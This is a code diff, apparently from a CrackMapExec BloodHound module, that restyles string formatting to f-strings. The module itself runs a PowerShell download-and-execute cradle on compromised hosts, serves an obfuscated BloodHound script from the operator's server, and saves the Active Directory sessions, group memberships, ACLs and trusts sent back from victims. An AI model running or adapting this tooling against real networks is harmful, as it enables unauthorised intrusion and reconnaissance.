@@ -58,16 +58,18 @@ class CMEModule:
         self.ps_script = obfs_ps_script('BloodHound-modified.ps1')
 
     def on_admin_login(self, context, connection):
-        if self.neo4j_URI == "" and self.neo4j_user == "" and self.neo4j_pass == "" :
-            command = "Invoke-BloodHound -CSVFolder '{}' -Throttle '{}' -CollectionMethod '{}'".format(self.csv_path, self.threads, self.collection_method)
-        else :
-            command = 'Invoke-BloodHound -URI {} -UserPass "{}:{}" -Throttle {} -CollectionMethod {}'.format(self.neo4j_URI, self.neo4j_user, self.neo4j_pass, self.threads, self.collection_method)
+        if self.neo4j_URI == "" and self.neo4j_user == "" and self.neo4j_pass == "":
+            command = f"Invoke-BloodHound -CSVFolder '{self.csv_path}' -Throttle '{self.threads}' -CollectionMethod '{self.collection_method}'"
+
+        else:
+            command = f'Invoke-BloodHound -URI {self.neo4j_URI} -UserPass "{self.neo4j_user}:{self.neo4j_pass}" -Throttle {self.threads} -CollectionMethod {self.collection_method}'
+
         launcher = gen_ps_iex_cradle(context, 'BloodHound-modified.ps1', command)
         connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'BloodHound-modified.ps1' == request.path[1:]:
+        if request.path[1:] == 'BloodHound-modified.ps1':
             request.send_response(200)
             request.end_headers()
             request.wfile.write(self.ps_script.encode())
@@ -93,24 +95,29 @@ class CMEModule:
 
         parsedData = data.split("!-!")
         nameList = ['user_sessions', 'group_membership.csv', 'acls.csv', 'local_admins.csv', 'trusts.csv']
-        for x in range(0, len(parsedData)):
-            if "ComputerName" in parsedData[x] and "UserName" in parsedData[x] :
-                log_name = '{}-{}-{}.csv'.format(nameList[0], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+        for x in range(len(parsedData)):
+            if "ComputerName" in parsedData[x] and "UserName" in parsedData[x]:
+                log_name = f'{nameList[0]}-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.csv'
+
                 write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
-                context.log.info("Saved csv output to {}".format(log_name))
-            elif "GroupName" in parsedData[x] and "AccountName" in parsedData[x] :
-                log_name = '{}-{}-{}.csv'.format(nameList[1], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+                context.log.info(f"Saved csv output to {log_name}")
+            elif "GroupName" in parsedData[x] and "AccountName" in parsedData[x]:
+                log_name = f'{nameList[1]}-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.csv'
+
                 write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
-                context.log.info("Saved csv output to {}".format(log_name))
-            elif "ComputerName" in parsedData[x] and "AccountName" in parsedData[x] :
-                log_name = '{}-{}-{}.csv'.format(nameList[3], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+                context.log.info(f"Saved csv output to {log_name}")
+            elif "ComputerName" in parsedData[x] and "AccountName" in parsedData[x]:
+                log_name = f'{nameList[3]}-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.csv'
+
                 write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
-                context.log.info("Saved csv output to {}".format(log_name))
-            elif "SourceDomain" in parsedData[x] and "TrustType" in parsedData[x] :
-                log_name = '{}-{}-{}.csv'.format(nameList[4], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+                context.log.info(f"Saved csv output to {log_name}")
+            elif "SourceDomain" in parsedData[x] and "TrustType" in parsedData[x]:
+                log_name = f'{nameList[4]}-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.csv'
+
                 write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
-                context.log.info("Saved csv output to {}".format(log_name))
-            elif "ObjectName" in parsedData[x] and "ObjectType" in parsedData[x] :
-                log_name = '{}-{}-{}.csv'.format(nameList[2], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+                context.log.info(f"Saved csv output to {log_name}")
+            elif "ObjectName" in parsedData[x] and "ObjectType" in parsedData[x]:
+                log_name = f'{nameList[2]}-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.csv'
+
                 write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
-                context.log.info("Saved csv output to {}".format(log_name))
+                context.log.info(f"Saved csv output to {log_name}")
